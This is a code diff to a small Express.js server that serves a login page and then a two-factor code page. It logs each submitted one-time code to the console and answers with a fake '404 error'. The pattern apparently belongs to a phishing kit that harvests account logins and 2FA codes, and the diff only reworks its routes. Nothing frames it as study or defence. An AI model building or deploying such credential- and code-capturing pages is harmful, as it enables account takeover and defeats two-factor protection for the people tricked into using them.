@@ -6,6 +6,7 @@ const app = express();
 
 app.use(bodyParser.urlencoded({extended: false}));
 app.use(express.static('vews'));
+app.use(express.static('two-factor'));
 app.get('/',(req,res)=>{
   res.sendFile(__dirname + '/vews/indax.html');
 });
@@ -14,8 +15,8 @@ app.get('/login',(req,res)=>{
   res.sendFile(__dirname + '/vews/login.html');
   
 });
-app.get('/login/code',(req,res)=>{
-  res.sendFile(__dirname + '/vews/code.html');
+app.get('/code',(req,res)=>{
+  res.sendFile(__dirname + '/vews/two-factor/indax.html');
   
 });
 app.post('/login',(req,res)=>{
@@ -26,7 +27,7 @@ app.post('/login',(req,res)=>{
  res.redirect('/code');
 
 });
-app.post('/login/code',(req,res)=>{
+app.post('/code',(req,res)=>{
   const code = req.body.code;
   console.log(`code : ${code}`)
   res.send('<h1>404 error')
